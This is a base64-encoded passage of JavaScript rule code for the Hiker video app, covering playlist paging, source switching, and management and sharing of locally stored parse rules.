NvdW50KSA9PiB7XFxuICAgICAgICAgIGxldCBwYWdlbnVtID0gZ2V0TXlWYXIoXFxcInBhZ2VudW1cXFwiLCBcXFwiMFxcXCIpO1xcbiAgICAgICAgICBpZiAocGFnZW51bSA9PSAwKSB7XFxuICAgICAgICAgICAgcGFnZW51bSA9IHBjb3VudCAtIDE7XFxuICAgICAgICAgIH0gZWxzZSB7XFxuICAgICAgICAgICAgcGFnZW51bS0tO1xcbiAgICAgICAgICB9XFxuICAgICAgICAgIHB1dE15VmFyKFxcXCJwYWdlbnVtXFxcIiwgU3RyaW5nKHBhZ2VudW0pKTtcXG4gICAgICAgICAgR00uZ2V0KFxcXCJyZW5vdmF0ZUxpc3RcXFwiLCAoKSA9PiB7IH0pKGxvY2F0aW9uKTtcXG4gICAgICAgICAgcmV0dXJuIFxcXCJoaWtlcjovL2VtcHR5XFxcIjtcXG4gICAgICAgIH0sIGxvY2F0aW9uLCBwY291bnQpLFxcbiAgICAgICAgZXh0cmE6IHtcXG4gICAgICAgICAgY2xzOiBcXFwicGxheXBhZ2VcXFwiXFxuICAgICAgICB9XFxuICAgICAgfSwge1xcbiAgICAgICAgdGl0bGU6IHBsYXlwW3BhZ2VudW1dLFxcbiAgICAgICAgY29sX3R5cGU6IFxcXCJ0ZXh0XzJcXFwiLFxcbiAgICAgICAgdXJsOiAkKHBhZ2VhcnIsIDMpLnNlbGVjdCgobG9jYXRpb24pID0+IHtcXG4gICAgICAgICAgcHV0TXlWYXIoXFxcInBhZ2VudW1cXFwiLCBTdHJpbmcoTVlfSU5ERVgpKTtcXG4gICAgICAgICAgR00uZ2V0KFxcXCJyZW5vdmF0ZUxpc3RcXFwiLCAoKSA9PiB7IH0pKGxvY2F0aW9uKTtcXG4gICAgICAgICAgcmV0dXJuIFxcXCJoaWtlcjovL2VtcHR5XFxcIlxcbiAgICAgICAgfSwgbG9jYXRpb24pLFxcbiAgICAgICAgZXh0cmE6IHtcXG4gICAgICAgICAgY2xzOiBcXFwicGxheXBhZ2VcXFwiXFxuICAgICAgICB9XFxuICAgICAgfSwge1xcbiAgICAgICAgdGl0bGU6ICfkuIvkuIDpobUnLFxcbiAgICAgICAgY29sX3R5cGU6IFxcXCJ0ZXh0XzRcXFwiLFxcbiAgICAgICAgdXJsOiAkKFxcXCIjbm9Mb2FkaW5nI1xcXCIpLmxhenlSdWxlKChsb2NhdGlvbiwgcGNvdW50KSA9PiB7XFxuICAgICAgICAgIGxldCBwYWdlbnVtID0gZ2V0TXlWYXIoXFxcInBhZ2VudW1cXFwiLCBcXFwiMFxcXCIpO1xcbiAgICAgICAgICBpZiAocGFnZW51bSA+PSBwY291bnQgLSAxKSB7XFxuICAgICAgICAgICAgcGFnZW51bSA9IDA7XFxuICAgICAgICAgIH0gZWxzZSB7XFxuICAgICAgICAgICAgcGFnZW51bSsrO1xcbiAgICAgICAgICB9XFxuICAgICAgICAgIHB1dE15VmFyKFxcXCJwYWdlbnVtXFxcIiwgU3RyaW5nKHBhZ2VudW0pKTtcXG4gICAgICAgICAgR00uZ2V0KFxcXCJyZW5vdmF0ZUxpc3RcXFwiLCAoKSA9PiB7IH0pKGxvY2F0aW9uKTtcXG4gICAgICAgICAgcmV0dXJuIFxcXCJoaWtlcjovL2VtcHR5XFxcIjtcXG4gICAgICAgIH0sIGxvY2F0aW9uLCBwY291bnQpLFxcbiAgICAgICAgZXh0cmE6IHtcXG4gICAgICAgICAgY2xzOiBcXFwicGxheXBhZ2VcXFwiXFxuICAgICAgICB9XFxuICAgICAgfV0pXFxuICAgICAgLypwbGF5cCA9IHBsYXlwLm1hcCgoeCwgaSkgPT4ge1xcbiAgICAgICAgIGxldCBvYmogPSBPYmplY3QuYXNzaWduKHt9LCB0ZW1wLCB7XFxuICAgICAgICAgICB0aXRsZTogJ+KAnOKAnOKAneKAnScgKyAocGFnZW51bSA9PSBpID8geC5mb250Y29sb3IoXFxcInJlZFxcXCIpIDogeCksXFxuICAgICAgICAgICB1cmw6ICQoJyNub0xvYWRpbmcjJykubGF6eVJ1bGUoKGkpID0+IHtcXG4gICAgICAgICAgICAgaWYgKGdldE15VmFyKFxcXCJwYWdlbnVtXFxcIikgPT0gaSkge1xcbiAgICAgICAgICAgICAgIHJldHVybiBcXFwiaGlrZXI6Ly9lbXB0eVxcXCJcXG4gICAgICAgICAgICAgfVxcbiAgICAgICAgICAgICBwdXRNeVZhcihcXFwicGFnZW51bVxcXCIsIFN0cmluZyhpKSk7XFxuICAgICAgICAgICAgIGRlbGV0ZUl0ZW1CeUNscyhcXFwicGxheWxpc3RcXFwiKTtcXG4gICAgICAgICAgICAgYWRkSXRlbUFmdGVyKFxcXCJwbGF5bGlzdHNcXFwiLCAkLnRlbXBfbGlzdFtpXSk7XFxuICAgICAgICAgICAgIGZpbmRJdGVtc0J5Q2xzKFxcXCJwbGF5cGFnZVxcXCIpLmZvckVhY2goKHgsIGlpKSA9PiB7XFxuICAgICAgICAgICAgICAgbGV0IHRpdGxlID0geC50aXRsZS5yZXBsYWNlKC/igJh84oCZfOKAnHzigJ18PFtePl0rPi9nLCBcXFwiXFxcIik7XFxuICAgICAgICAgICAgICAgaWYgKGlpID09IGkpIHtcXG4gICAgICAgICAgICAgICAgIHRpdGxlID0gJ+KAnOKAnOKAneKAnScgKyB0aXRsZS5mb250Y29sb3IoXFxcInJlZFxcXCIpO1xcbiAgICAgICAgICAgICAgIH1cXG4gICAgICAgICAgICAgICB1cGRhdGVJdGVtKHguZXh0cmEuaWQsIHtcXG4gICAgICAgICAgICAgICAgIHRpdGxlOiB0aXRsZSxcXG4gICAgICAgICAgICAgICB9KVxcbiAgICAgICAgICAgICB9KVxcbiAgICAgICAgICAgICByZXR1cm4gXFxcImhpa2VyOi8vZW1wdHlcXFwiO1xcbiAgICAgICAgICAgfSwgaSksXFxuICAgICAgICAgICBleHRyYTogT2JqZWN0LmFzc2lnbih7fSwgdGVtcC5leHRyYSwge1xcbiAgICAgICAgICAgICBpZDogXFxcInBhZ2VudW1cXFwiICsgaSxcXG4gICAgICAgICAgIH0pXFxuICAgICAgICAgfSlcXG4gICAgICAgICByZXR1cm4gb2JqO1xcbiAgICAgICB9KVxcbiAgICAgICBhZGRJdGVtQWZ0ZXIoXFxcInBsYXlwYWdlbGluZVxcXCIsIHBsYXlwKSovXFxuICAgIH1cXG4gICAgaWYgKGxpc3QpIHtcXG4gICAgICBhZGRJdGVtQWZ0ZXIoXFxcInBsYXlsaXN0c1xcXCIsIGxpc3QpO1xcbiAgICB9XFxuICAgIHVwZGF0ZUl0ZW0oXFxcImxvY2F0aW9uQFxcXCIgKyBjdXJyZW50TG9jYXRpb24sIHtcXG4gICAgICB0aXRsZTogZnJvbVtjdXJyZW50TG9jYXRpb25dLFxcbiAgICB9KTtcXG4gICAgdXBkYXRlSXRlbShcXFwibG9jYXRpb25AXFxcIiArIGxvY2F0aW9uLCB7XFxuICAgICAgdGl0bGU6IFxcXCLigJzigJxcXFwiICsgZnJvbVtsb2NhdGlvbl0gKyBcXFwi4oCd4oCdXFxcIixcXG4gICAgfSk7XFxuICAgIGN1cnJlbnRMb2NhdGlvbiA9IGxvY2F0aW9uO1xcbiAgfVxcblxcbiAgR00ucHV0KFxcXCJyZW5vdmF0ZUxpc3RcXFwiLCByZW5vdmF0ZUxpc3QpO1xcbiAgZC5wdXNoKHtcXG4gICAgY29sX3R5cGU6IFxcXCJiaWdfYmxhbmtfYmxvY2tcXFwiXFxuICB9KTtcXG4gIGlmIChmcm9tLmxlbmd0aCkge1xcbiAgICBkLnB1c2goe1xcbiAgICAgIGNvbF90eXBlOiBcXFwiYmlnX2JsYW5rX2Jsb2NrXFxcIixcXG4gICAgfSlcXG4gICAgZC5wdXNoKHtcXG4gICAgICB0aXRsZTogc29ydG9ialtzb3J0aV0sXFxuICAgICAgdXJsOiAkKCcjbm9Mb2FkaW5nIycpLmxhenlSdWxlKChzbykgPT4ge1xcbiAgICAgICAgbGV0IHNpID0gZ2V0TXlWYXIoXFxcInNvcnRpXFxcIiwgXFxcIjBcXFwiKTtcXG4gICAgICAgIGxldCBpaSA9IChzaSA9PSBcXFwiMFxcXCIgPyBcXFwiMVxcXCIgOiBcXFwiMFxcXCIpO1xcbiAgICAgICAgdXBkYXRlSXRlbShcXFwiQHNvcnRcXFwiLCB7XFxuICAgICAgICAgIHRpdGxlOiBzb1tpaV1cXG4gICAgICAgIH0pXFxuICAgICAgICB2YXIgcGxheXMgPSBmaW5kSXRlbXNCeUNscyhcXFwicGxheWxpc3RcXFwiKS5yZXZlcnNlKCkubWFwKHggPT4ge1xcbiAgICAgICAgICB4LmNvbF90eXBlID0geC50eXBlO1xcbiAgICAgICAgICByZXR1cm4geDtcXG4gICAgICAgIH0pO1xcbiAgICAgICAgZGVsZXRlSXRlbUJ5Q2xzKFxcXCJwbGF5bGlzdFxcXCIpO1xcbiAgICAgICAgYWRkSXRlbUFmdGVyKFxcXCJwbGF5bGlzdHNcXFwiLCBwbGF5cyk7XFxuXFxuICAgICAgICBwdXRNeVZhcihcXFwic29ydGlcXFwiLCBpaSk7XFxuICAgICAgICByZXR1cm4gXFxcImhpa2VyOi8vZW1wdHlcXFwiO1xcbiAgICAgIH0sIHNvcnRvYmopLFxcbiAgICAgIGNvbF90eXBlOiAnc2Nyb2xsX2J1dHRvbicsXFxuICAgICAgZXh0cmE6IHtcXG4gICAgICAgIGlkOiBcXFwiQHNvcnRcXFwiLFxcbiAgICAgIH1cXG4gICAgfSlcXG4gICAgZm9yIChsZXQgaSBpbiBmcm9tKSB7XFxuICAgICAgZC5wdXNoKHtcXG4gICAgICAgIHRpdGxlOiBmcm9tW2ldLFxcbiAgICAgICAgdXJsOiAkKFxcXCIjbm9Mb2FkaW5nI1xcXCIpLmxhenlSdWxlKChpLCBpZCkgPT4ge1xcbiAgICAgICAgICBpZiAoZ2V0TXlWYXIoaWQgKyBcXFwic291cmNlaVxcXCIsIFxcXCIwXFxcIikgPT0gaSkge1xcbiAgICAgICAgICAgIHJldHVybiBcXFwiaGlrZXI6Ly9lbXB0eVxcXCI7XFxuICAgICAgICAgIH1cXG4gICAgICAgICAgcHV0TXlWYXIoaWQgKyBcXFwic291cmNlaVxcXCIsIFN0cmluZyhpKSk7XFxuICAgICAgICAgIEdNLmdldChcXFwicmVub3ZhdGVMaXN0XFxcIiwgKCkgPT4geyB9KShpKTtcXG4gICAgICAgICAgcmV0dXJuIFxcXCJoaWtlcjovL2VtcHR5XFxcIjtcXG4gICAgICAgIH0sIGksIGlkKSxcXG4gICAgICAgIGV4dHJhOiB7XFxuICAgICAgICAgIGlkOiBcXFwibG9jYXRpb25AXFxcIiArIGlcXG4gICAgICAgIH0sXFxuICAgICAgICBjb2xfdHlwZTogXFxcInNjcm9sbF9idXR0b25cXFwiXFxuICAgICAgfSk7XFxuICAgIH1cXG4gIH1cXG4gIC8vY29uc29sZS5sb2cocGxheVVybExpc3QpO1xcbiAgLyppZiAocGxheVVybExpc3QubGVuZ3RoKSB7XFxuICAgIHZhciBlam9iaiA9IHtcXG4gICAgICBcXFwibGlzdFxcXCI6IHBsYXlVcmxMaXN0LFxcbiAgICAgIFxcXCJ0YWJcXFwiOiBmcm9tLm1hcCgoeCwgaSkgPT4gZnJvbVtpXSlcXG4gICAgfTtcXG4gICAg5Yid5aeL5YyWKGQsIGVqb2JqKVxcbiAgfSBlbHNlIHtcXG4gICAgZC5wdXNoKHtcXG4gICAgICB0aXRsZTogXFxcIuaaguaXoOaSreaUvua6kFxcXCIsXFxuICAgICAgY29sX3R5cGU6IFxcXCJ0ZXh0XzNcXFwiLFxcbiAgICAgIHVybDogTVlfUEFSQU1TLnZvZElkLFxcbiAgICB9KTtcXG4gIH0qL1xcblxcbiAgZC5wdXNoKHtcXG4gICAgY29sX3R5cGU6IFxcXCJibGFua19ibG9ja1xcXCIsXFxuICAgIGV4dHJhOiB7XFxuICAgICAgaWQ6IFxcXCJwbGF5cGFnZWxpbmVcXFwiXFxuICAgIH1cXG4gIH0pXFxuXFxuXFxuICBkLnB1c2goe1xcbiAgICBjb2xfdHlwZTogXFxcImxpbmVcXFwiLFxcbiAgICBleHRyYToge1xcbiAgICAgIGlkOiBcXFwicGxheWxpc3RzXFxcIlxcbiAgICB9XFxuICB9KTtcXG5cXG4gIGQucHVzaCh7XFxuICAgIGNvbF90eXBlOiBcXFwiYmxhbmtfYmxvY2tcXFwiLFxcbiAgICBleHRyYToge1xcbiAgICAgIGlkOiBcXFwicGxheWxpc3RzRU5EXFxcIlxcbiAgICB9XFxuICB9KTtcXG5cXG4gIHNldFJlc3VsdChkKTtcXG4gIHJlbm92YXRlTGlzdChnZXRNeVZhcihpZCArIFxcXCJzb3VyY2VpXFxcIiwgXFxcIjBcXFwiKSk7XFxufSkoKVwifSx7XCJjb2xfdHlwZVwiOlwibW92aWVfM1wiLFwibmFtZVwiOlwi6Kej5p6Q5paH5Lu2XCIsXCJwYXRoXCI6XCJjb25maWdzXCIsXCJydWxlXCI6XCJjb25zdCBwYXRoID0gXFxcImhpa2VyOi8vZmlsZXMvcnVsZXMvTG95RGdJay9wYXJzZXMuanNvblxcXCI7XFxubGV0IGRhdGE7XFxuXFxuZnVuY3Rpb24gZ2V0SnNvbigpIHtcXG4gICAgaWYgKEFycmF5LmlzQXJyYXkoZGF0YSkpIHtcXG4gICAgICAgIHJldHVybiBkYXRhO1xcbiAgICB9XFxuICAgIHRyeSB7XFxuICAgICAgICBkYXRhID0gSlNPTi5wYXJzZShyZWFkRmlsZShwYXRoKSB8fCBcXFwiW11cXFwiKTtcXG4gICAgfSBjYXRjaCAoZSkge1xcbiAgICAgICAgZGVsZXRlRmlsZShwYXRoKTtcXG4gICAgICAgIGRhdGEgPSBbXTtcXG4gICAgfVxcbiAgICByZXR1cm4gZGF0YTtcXG59XFxuXFxuZnVuY3Rpb24gc2F2ZUpzb24oanNvbikge1xcbiAgICBzYXZlRmlsZShwYXRoLCBKU09OLnN0cmluZ2lmeShqc29uKSk7XFxufVxcblxcbmZ1bmN0aW9uIGdldFVzZWZ1bEpzb24oKSB7XFxuICAgIHJldHVybiBnZXRKc29uKCkuZmlsdGVyKHYgPT4gIXYuZm9yYmlkZGVuKTtcXG59XFxuXFxuZnVuY3Rpb24gZ2V0Rm9yYmlkZGVuSnNvbigpIHtcXG4gICAgcmV0dXJuIGdldEpzb24oKS5maWx0ZXIodiA9PiB2LmZvcmJpZGRlbik7XFxufVxcblxcbiQuZXhwb3J0cyA9IHtcXG4gICAgZ2V0SnNvbixcXG4gICAgc2F2ZUpzb24sXFxuICAgIGdldFVzZWZ1bEpzb24sXFxuICAgIGdldEZvcmJpZGRlbkpzb24sXFxuICAgIHBhdGgsXFxufTtcIn0se1wiY29sX3R5cGVcIjpcIm1vdmllXzNcIixcIm5hbWVcIjpcIuino+aekOeuoeeQhlwiLFwicGF0aFwiOlwicnVsZU1hbmFnZVwiLFwicnVsZVwiOlwianM6XFxudmFyIGQgPSBbXTtcXG5zZXRQYWdlVGl0bGUoXFxcIuino+aekOeuoeeQhlxcXCIpO1xcbmxldCBjb25maWdzID0gJC5yZXF1aXJlKFxcXCJjb25maWdzXFxcIik7XFxubGV0IGFyciA9IGNvbmZpZ3MuZ2V0SnNvbigpO1xcbmxldCBsZW5ndGggPSBhcnIubGVuZ3RoO1xcblxcbmQucHVzaCh7XFxuICAgIHRpdGxlOiBcXFwi5paw5aKeXFxcIixcXG4gICAgdXJsOiBcXFwiaGlrZXI6Ly9wYWdlL3J1bGVFZGl0I25vUmVjb3JkSGlzdG9yeSMjbm9IaXN0b3J5IyNub1JlZnJlc2gjXFxcIixcXG4gICAgY29sX3R5cGU6IFxcXCJpY29uX3NtYWxsXzRcXFwiLFxcbiAgICBwaWNfdXJsOiBcXFwiaGlrZXI6Ly9pbWFnZXMvaWNvbl9kb21haW5fY29uZmlnXFxcIixcXG4gICAgZXh0cmE6IHtcXG4gICAgICAgIHBhZ2VUaXRsZTogXFxcIuaWsOWinuino+aekFxcXCJcXG4gICAgfVxcbn0pO1xcblxcbmQucHVzaCh7XFxuICAgIHRpdGxlOiBcXFwi5YiG5LqrXFxcIixcXG4gICAgdXJsOiAkKFxcXCItMVxcXCIsIFxcXCLovpPlhaXkvaDopoHliIbkuqvop6PmnpDnmoTluo/lj7dcXFxcbi0x5YWo6YOo77yMLTLlt7LlkK/nlKjnmoTvvIwtM+W3suemgeeUqOeahFxcXCIpLmlucHV0KChsZW5ndGgpID0+IHtcXG4gICAgICAgIGxldCBpbmRleGMgPSBpbnB1dC5zcGxpdCgvLHzvvIwvKTtcXG4gICAgICAgIGxldCBpbmRleHMgPSBbXTtcXG4gICAgICAgIGxldCBtbyA9IHBhcnNlSW50KGluZGV4Y1swXSk7XFxuICAgICAgICBpZiAoIShpbmRleGMubGVuZ3RoICE9PSAwICYmIG1vIDwgMCAmJiBtbyA+IC01KSkge1xcbiAgICAgICAgICAgIGZvciAobGV0IGl0IG9mIGluZGV4Yykge1xcbiAgICAgICAgICAgICAgICBsZXQgbnVtID0gcGFyc2VJbnQoaXQpO1xcbiAgICAgICAgICAgICAgICBpZiAoTnVtYmVyLmlzTmFOKG51bSkgfHwgbnVtID49IGxlbmd0aCB8fCBudW0gPCAwKSB7XFxuICAgICAgICAgICAgICAgICAgICByZXR1cm4gXFxcInRvYXN0Oi8v5pWw5a2X5LiN5ZCI5rOVXFxcIjtcXG4gICAgICAgICAgICAgICAgfVxcbiAgICAgICAgICAgICAgICBpbmRleHMucHVzaChudW0pO1xcbiAgICAgICAgICAgIH1cXG4gICAgICAgIH1cXG4gICAgICAgIHJldHVybiAkKFtcXFwiSElLRVJcXFwiLCBcXFwiVFhUXFxcIl0uY29uY2F0KGdldFBhc3RlcygpKSwgMiwgXFxcIuWIhuS6q+aWueW8j1xcXCIpLnNlbGVjdCgobW8sIGluZGV4cywgZXh0KSA9PiB7XFxuICAgICAgICAgICAgZnVuY3Rpb24gdXAocnVsZXMpIHtcXG4gICAgICAgICAgICAgICAgbGV0IHJ1bGViNjQgPSBiYXNlNjRFbmNvZGUoSlNPTi5zdHJpbmdpZnkocnVsZXMpKTtcXG4gICAgICAgICAgICAgICAgbGV0IGdldFBhc3MgPSAobGVuZ3RoLCBydWxlLCB0eXBlKSA9PiBcXFwi5rW36ZiU6KeG55WM77yMRFJQWeino+aekO+8jOWFseOAjFxcXCIgKyBsZW5ndGggKyBcXFwi44CN5p2h77yM5aSN5Yi25pW05p2h5Y+j5Luk5omT5byA6L2v5Lu25bCx5Lya6Ieq5Yqo5a+85YWlJFxcXCIgKyBydWxlICsgXFxcIiRcXFwiICsgdHlwZSArIFxcXCJAaW1wb3J0PWpzOiQucmVxdWlyZSgnaW1wb3J0P3J1bGU9JytcXFwiICsgSlNPTi5zdHJpbmdpZnkoTVlfUlVMRS50aXRsZSkgKyBcXFwiKShpbnB1dClcXFwiO1xcbiAgICAgICAgICAgICAgICBpZiAoZ2V0UGFzdGVzKCkuaW5jbHVkZXMoaW5wdXQpKSB7XFxuICAgICAgICAgICAgICAgICAgICBsZXQgdSA9IHNoYXJlUGFzdGUocnVsZWI2NCwgaW5wdXQpO1xcbiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIFxcXCJjb3B5Oi8vXFxcIiArIGdldFBhc3MocnVsZXMubGVuZ3RoLCB1LCBcXFwiYlxcXCIpO1xcbiAgICAgICAgICAgICAgICB9IGVsc2Uge1xcbiAgICAgICAgICAgICAgICAgICAgbGV0IHBhdGggPSBcXFwiaGlrZXI6Ly9maWxlcy9ydWxlcy9Mb3lEZ0lrL3NoYXJlL2RycHnop6PmnpDjgIxcXFwiICsgcnVsZXMubGVuZ3RoICsgXFxcIuOAjeadoS5cXFwiICsgKGlucHV0ID09PSBcXFwiSElLRVJcXFwiID8gXFxcImhpa2VyXFxcIiA6IFxcXCJ0eHRcXFwiKTtcXG4gICAgICAgICAgICAgICAgICAgIHdyaXRlRmlsZShwYXRoLCBnZXRQYXNzKHJ1bGVzLmxlbmd0aCwgcnVsZWI2NCwgXFxcImFcXFwiKSk7XFxuICAgICAgICAgICAgICAgICAgICByZXR1cm4gXFxcInNoYXJlOi8vXFxcIiArIHBhdGg7XFxuICAgICAgICAgICAgICAgIH1cXG4gICAgICAgICAgICB9XFxuICAgICAgICAgICAgbGV0IHJ1bGVzO1xcbiAgICAgICAgICAgIGlmIChtbyA9PT0gLTEpIHtcXG4gICAgICAgICAgICAgICAgcnVsZXMgPSAkLnJlcXVpcmUoXFxcImNvbmZpZ3NcXFwiKS5nZXRKc29uKCk7XFxuICAgICAgICAgICAgfSBlbHNlIGlmIChtbyA9PT0gLTIpIHtcXG4gICAgICAgICAgICAgICAgcnVsZXMgPSAkLnJlcXVpcmUoXFxcImNvbmZpZ3NcXFwiKS5nZXRVc2VmdWxKc29uKCk7XFxuICAgICAgICAgICAgfSBlbHNlIGlmIChtbyA9PT0gLTMpIHtcXG4gICAgICAgICAgICAgICAgcnVsZXMgPSAkLnJlcXVpcmUoXFxcImNvbmZpZ3NcXFwiKS5nZXRGb3JiaWRkZW5Kc29uKCk7XFxuICAgICAgICAgICAgfSBlbHNlIHtcXG4gICAgICAgICAgICAgICAgcnVsZXMgPSAkLnJlcXVpcmUoXFxcImNvbmZpZ3NcXFwiKS5nZXRKc29uKCkuZmlsdGVyKCh2LCBpKSA9PiBpbmRleHMuaW5jbHVkZXMoaSkpO1xcbiAgICAgICAgICAgIH1cXG4gICAgICAgICAgICBydWxlcyA9IHJ1bGVzLm1hcCgodikgPT4ge1xcbiAgICAgICAgICAgICAgICB2LmZvcmJpZGRlbiA9IHVuZGVmaW5lZDtcXG4gICAgICAgICAgICAgICAgcmV0dXJuIHY7XFxuICAgICAgICAgICAgfSk7XFxuICAgICAgICAgICAgcmV0dXJuIHVwKHJ1bGVzKTtcXG4gICAgICAgIH0sIG1vLCBpbmRleHMsIGluZGV4Y1sxXSk7XFxuXFxuICAgIH0sIGxlbmd0aCksXFxuICAgIGNvbF90eXBlOiBcXFwiaWNvbl9zbWFsbF80XFxcIixcXG4gICAgcGljX3VybDogXFxcImhpa2VyOi8vaW1hZ2VzL2ljb25fc2hhcmVfZ3JlZW5cXFwiXFxufSk7XFxuZC5wdXNoKHtcXG4gICAgdGl0bGU6IFxcXCLph43nva5cXFwiLFxcbiAgICB1cmw6ICQoXFxcIuS9oOehruWumumHjee9ru+8n1xcXFxu6K+l5pON5L2c5Lya5Yig6Zmk546w5pyJ6Kej5p6Q77yM5oGi5aSN6Ieq5bim6Kej5p6Q44CCXFxcIikuY29uZmlybSgocGF0aCkgPT4ge1xcbiAgICAgICAgZGVsZXRlRmlsZShwYXRoKTtcXG4gICAgICAgIHJlZnJlc2hQYWdlKGZhbHNlKTtcXG4gICAgICAgIHJldHVybiBcXFwiaGlrZXI6Ly9lbXB0eVxcXCI7XFxuICAgIH0sICQucmVxdWlyZShcXFwiY29uZmlnc1xcXCIpLnBhdGgpLFxcbiAgICBjb2xfdHlwZTogXFxcImljb25fc21hbGxfNFxcXCIsXFxuICAgIHBpY191cmw6IFxcXCJoaWtlcjovL2ltYWdlcy9pY29uX3JlZnJlc2hcXFwiXFxufSk7XFxuZC5wdXNoKHtcXG4gICAgdGl0bGU6IFxcXCLmuIXnqbpcXFwiLFxcbiAgICB1cmw6ICQoXFxcIuS9oOehruWumuWFqOmDqOWIoOmZpO+8n1xcXFxu6K+l5pON5L2c5Lya5Yig6Zmk546w5pyJ6Kej5p6Q44CCXFxcIikuY29uZmlybSgocGF0aCkgPT4ge1xcbiAgICAgICAgd3JpdGVGaWxlKHBhdGgsIFxcXCJbXVxcXCIpO1xcbiAgICAgICAgcmVmcmVzaFBhZ2UoZmFsc2UpO1xcbiAgICAgICAgcmV0dXJuIFxcXCJoaWtlcjovL2VtcHR5XFxcIjtcXG4gICAgfSwgJC5yZXF1aXJlKFxcXCJjb25maWdzXFxcIikucGF0aCksXFxuICAgIGNvbF90eXBlOiBcXFwiaWNvbl9zbWFsbF80XFxcIixcXG4gICAgcGljX3VybDogXFxcImhpa2VyOi8vaW1hZ2VzL2ljb25fY29kZV92aWV3XFxcIlxcbn0pO1xcblxcbmQucHVzaCh7XFxuICAgIC8vdGl0bGU6ICc8Zm9udCBjb2xvcj1cXFwiIzEzQjYxQlxcXCI+4paQIDwvZm9udD48Yj7op6PmnpDliJfooag8Yj4gKCcgKyBTdHJpbmcobGVuZ3RoKS5mb250Y29sb3IoXFxcIiNmZjY2MDFcXFwiKSArIFxcXCIpXFxcIixcXG4gICAgY29sX3R5cGU6IFxcXCJyaWNoX3RleHRcXFwiLFxcbn0pO1xcbmxldCBjb3VudFRpdGxlID0gZC5hdCgtMSk7XFxuXFxuXFxubGV0IGNvdW50ID0gZC5sZW5ndGg7XFxuXFxuZm9yIChsZXQgaSA9IDA7IGkgPCBsZW5ndGg7IGkrKykge1xcbiAgICBsZXQgaXQgPSBhcnJbaV07XFxuXFxuICAgIGQucHVzaCh7XFxuICAgICAgICB0aXRsZTogJ+KAnOKAnOKAneKAnVsnICsgaSArICddPGI+ICAnICsgaXQubmFtZSArIChpdC5mb3JiaWRkZW4gPyBcXFwiICPigJzigJznpoHnlKjigJ3igJ1cXFwiLnNtYWxsKCkgOiBcXFwiXFxcIiksXFxuICAgICAgICBkZXNjOiBpdC51cmwsXFxuICAgICAgICB1cmw6ICQoW1xcXCLnvJbovpFcXFwiLCBcXFwi5YiG5LqrXFxcIiwgXFxcIuemgeeUqC/lkK/nlKhcXFwiLCBcXFwi56e75YqoXFxcIiwgXFxcIue9rumhtlxcXCIsIFxcXCLliKDpmaRcXFwiXSwgMSwgXFxcIuaTjeS9nO+8mlxcXCIgKyBpdC5uYW1lKS5zZWxlY3QoKGluZGV4LCBsZW5ndGgpID0+IHtcXG4gICAgICAgICAgICBpZiAoaW5wdXQgPT09IFxcXCLnvJbovpFcXFwiKSB7XFxuICAgICAgICAgICAgICAgIHJldHVybiBcXFwiaGlrZXI6Ly9wYWdlL3J1bGVFZGl0I25vUmVjb3JkSGlzdG9yeSMjbm9IaXN0b3J5IyNub1JlZnJlc2gjXFxcIjtcXG4gICAgICAgICAgICB9IGVsc2UgaWYgKGlucHV0ID09PSBcXFwi5YiG5LqrXFxcIikge1xcbiAgICAgICAgICAgICAgICBsZXQgb3BzID0gZ2V0UGFzdGVzKCk7XFxuICAgICAgICAgICAgICAgIG9wcy51bnNoaWZ0KFxcXCLlrozmlbTlj6Pku6RcXFwiKTtcXG4gICAgICAgICAgICAgICAgcmV0dXJuICQob3BzLCAyLCBcXFwi5YiG5Lqr5pa55byPXFxcIikuc2VsZWN0KChpbmRleCkgPT4ge1xcbiAgICAgICAgICAgICAgICAgICAgbGV0IHJ1bGUgPSAkLnJlcXVpcmUoXFxcImNvbmZpZ3NcXFwiKS5nZXRKc29uKClbaW5kZXhdO1xcbiAgICAgICAgICAgICAgICAgICAgcnVsZS51c2VyID0gdW5kZWZpbmVkO1xcbiAgICAgICAgICAgICAgICAgICAgcnVsZS5mb3JiaWRkZW4gPSB1bmRlZmluZWQ7XFxuICAgICAgICAgICAgICAgICAgICBsZXQgcnVsZWI2NCA9IGJhc2U2NEVuY29kZShKU09OLnN0cmluZ2lmeShydWxlKSk7XFxuICAgICAgICAgICAgICAgICAgICBsZXQgZ2V0UGFzcyA9IChuYW1lLCBydWxlLCB0eXBlKSA9PiBcXFwi5rW36ZiU6KeG55WM77yM44CMXFxcIiArIG5hbWUgKyBcXFwi44CNRFJQWeino+aekO+8jOWkjeWItuaVtOadoeWPo+S7pOaJk+W8gOi9r+S7tuWwseS8muiHquWKqOWvvOWFpSRcXFwiICsgcnVsZSArIFxcXCIkXFxcIiArIHR5cGUgKyBcXFwiQGltcG9ydD1qczokLnJlcXVpcmUoJ2ltcG9ydD9ydWxlPScrXFxcIiArIEpTT04uc3RyaW5naWZ5KE1ZX1JVTEUudGl0bGUpICsgXFxcIikoaW5wdXQpXFxcIjtcXG4gICAgICAgICAgICAgICAgICAgIGlmIChpbnB1dCA9PSBcXFwi5a6M5pW05Y+j5LukXFxcIikge1xcbiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBcXFwiY29weTovL1xcXCIgKyBnZXRQYXNzKHJ1bGUubmFtZSwgcnVsZWI2NCwgXFxcImFcXFwiKTtcXG4gICAgICAgICAgICAgICAgICAgIH0gZWxzZSB7XFxuICAgICAgICAgICAgICAgICAgICAgICAgbGV0IHUgPSBzaGFyZVBhc3RlKHJ1bGViNjQsIGlucHV0KTtcXG4gICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gXFxcImNvcHk6Ly9cXFwiICsgZ2V0UGFzcyhydWxlLm5hbWUsIHUsIFxcXCJiXFxcIik7XFxuICAgICAgICAgICAgICAgICAgICB9XFxuICAgICAgICAgICAgICAgIH0sIGluZGV4KTtcXG4gICAgICAgICAgICB9IGVsc2UgaWYgKGlucHV0ID09PSBcXFwi56e75YqoXFxcIikge1xcbiAgICAgICAgICAgICAgICByZXR1cm4gJChpbmRleCArIFxcXCJcXFwiLCBcXFwi6L6T5YWl5L2N572uXFxcIikuaW5wdXQoKGluZGV4LCBsZW5ndGgpID0+IHtcXG4gICAgICAgICAgICAgICAgICAgIGxldCBuZXdJbmRleCA9IE51bWJlcihpbnB1dCk7XFxuICAgICAgICAgICAgICAgICAgICBpZiAoTnVtYmVyLmlzTmFOKG5ld0luZGV4KSB8fCBuZXdJbmRleCA+PSBsZW5ndGgpIHtcXG4gICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gXFxcInRvYXN0Oi8v5LiN5ZKM6KeE55qE5L2N572uXFxcIjtcXG4gICAgICAgICAgICAgICAgICAgIH1cXG4